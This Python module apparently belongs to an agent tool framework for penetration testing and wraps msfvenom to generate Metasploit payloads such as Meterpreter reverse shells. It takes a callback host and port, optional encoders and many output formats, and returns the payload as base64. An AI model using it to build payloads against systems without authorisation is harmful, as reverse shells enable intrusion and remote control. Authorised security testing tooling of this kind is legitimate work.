import base64
import tempfile
import os

from tool_wrappers.base import ToolWrapper


class MsfPayloadWrapper(ToolWrapper):
    """Generate payloads via msfvenom.

    CRITICAL-risk: payload generation always requires user confirmation.
    """

    tool_name = "msf_payload"
    risk_level = "critical"

    VALID_FORMATS = {
        "exe", "elf", "raw", "python", "ruby", "c", "js_le", "js_be",
        "java", "dll", "macho", "asp", "aspx", "war", "psh", "bash",
        "vba", "vbs", "powershell",
    }

    def run(self, params: dict) -> dict:
        payload = params.get("payload")
        if not payload:
            raise ValueError("msf_payload requires 'payload' (e.g. windows/meterpreter/reverse_tcp)")

        lhost = params.get("lhost")
        if not lhost:
            raise ValueError("msf_payload requires 'lhost'")

        lport = params.get("lport", "4444")
        fmt = params.get("format", "raw")
        timeout = int(params.get("timeout", 120))
        stop_callback = params.get("__stop_callback")

        if fmt not in self.VALID_FORMATS:
            raise ValueError(f"Invalid format '{fmt}'. Valid: {', '.join(sorted(self.VALID_FORMATS))}")

        # Determine output path
        ext = {"exe": ".exe", "elf": "", "dll": ".dll", "war": ".war", "macho": ""}.get(fmt, ".bin")
        out_fd, out_path = tempfile.mkstemp(suffix=ext, prefix="msf_payload_")
        os.close(out_fd)

        cmd = [
            "msfvenom",
            "-p", payload,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", fmt,
            "-o", out_path,
        ]

        # Add extra options
        extra = params.get("options", {})
        if isinstance(extra, dict):
            for key, value in extra.items():
                cmd.append(f"{key}={value}")

        # Add encoder if specified
        encoder = params.get("encoder")
        if encoder:
            cmd.extend(["-e", encoder])
        iterations = params.get("iterations")
        if iterations:
            cmd.extend(["-i", str(iterations)])

        stdout = self._run_command(cmd, timeout=timeout, stop_callback=stop_callback)

        # Read and encode payload
        payload_b64 = ""
        payload_size = 0
        if os.path.exists(out_path):
            with open(out_path, "rb") as f:
                raw_bytes = f.read()
            payload_size = len(raw_bytes)
            payload_b64 = base64.b64encode(raw_bytes).decode("ascii")

        return {
            "payload": payload,
            "format": fmt,
            "lhost": lhost,
            "lport": lport,
            "file_path": out_path,
            "size_bytes": payload_size,
            "payload_b64": payload_b64,
            "raw": stdout,
        }
